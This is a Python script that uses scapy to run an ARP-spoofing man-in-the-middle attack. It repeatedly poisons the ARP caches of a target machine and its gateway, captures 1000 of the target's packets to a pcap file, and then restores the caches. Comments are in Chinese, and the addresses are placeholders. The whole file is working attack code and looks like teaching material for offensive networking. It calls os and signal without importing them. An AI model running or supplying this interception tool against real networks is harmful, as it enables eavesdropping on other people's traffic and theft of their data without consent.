#!/usr/bin/python3
# -*- coding: utf-8 -*-
 
import argparse
import threading
import time
 
from scapy.all import ARP, Ether, get_if_hwaddr, sendp, sniff, wrpcap, send
from scapy.layers.l2 import getmacbyip

# 恢复正常 IP 和 MAC 的缓存
def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):

    print('[*] Restoring target...')
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=target_mac), count=5)

    os.kill(os.getpid(), signal.SIGINT)

# 获取给定 IP 的 MAC    
def get_mac(tgt_ip):
    tgt_mac = getmacbyip(tgt_ip)
    if tgt_mac is not None:
        return tgt_mac
    else:
        print("无法获取IP为：%s 主机的MAC地址，请检查目标IP是否存活" % tgt_ip)

# 发送欺骗包，第二层  
def create_arp(src_mac, tgt_mac, gateway_ip, tgt_ip, gateway_mac):

    leth = Ether(src=src_mac, dst=tgt_mac)
    larp = ARP(hwsrc=src_mac, psrc=gateway_ip, hwdst=tgt_mac, pdst=tgt_ip, op="is-at")
    lpkt = leth / larp

    reth = Ether(src=src_mac, dst=gateway_mac)
    rarp = ARP(hwsrc=src_mac, psrc=tgt_ip, hwdst=gateway_mac, pdst=gateway_ip, op="is-at")
    rpkt = reth / rarp
    try:
        while True:
            sendp(lpkt, count=5)
            print('发送一个客户端包')
            sendp(rpkt, count=5)
            print('发送一个网关包')
            time.sleep(2)
    except KeyboardInterrupt:
        restore_target(gateway_ip, gateway_mac, tgt_ip, tgt_mac)
    return

# 定义需要的变量
tgt_ip       = '192.168.xx.xxx'   # '输入目标计算机IP'   # required=True
gateway_ip   = '192.168.xx.x'   # '输入网关IP'    # required=True
interface    = 'xxxxxxxxxxxxxxxxxxxxx'   # '输入使用的网卡'  # required=True
packet_count = 1000            # 嗅探包的个数

src_mac = get_if_hwaddr(interface)
tgt_mac = get_mac(tgt_ip)
gateway_mac = get_mac(gateway_ip)

print('本机MAC地址是：', src_mac)
print("目标计算机IP地址是：", tgt_ip)
print("目标计算机MAC地址是：", tgt_mac)
print("网关IP地址是：", gateway_ip)
print("网关MAC地址是：", gateway_mac)
try:
    input('按任意键继续：')
except:
    pass

# 启动发包函数进程
poison_thread = threading.Thread(target=create_arp, args=(src_mac, tgt_mac, gateway_ip, tgt_ip, gateway_mac))
poison_thread.start()

# 嗅探目标IP的包，并保存为WIRESHARK可读
try:
    print('[*] Starting sniffer for %d packets' % packet_count)

    bpf_filter = 'ip host %s' % tgt_ip
    packets    = sniff(count=packet_count, filter=bpf_filter, iface=interface) 

    wrpcap('arper.pcap', packets)

    restore_target(gateway_ip, gateway_mac, tgt_ip, tgt_mac)
except KeyboardInterrupt:
    restore_target(gateway_ip, gateway_mac, tgt_ip, tgt_mac)
    exit()
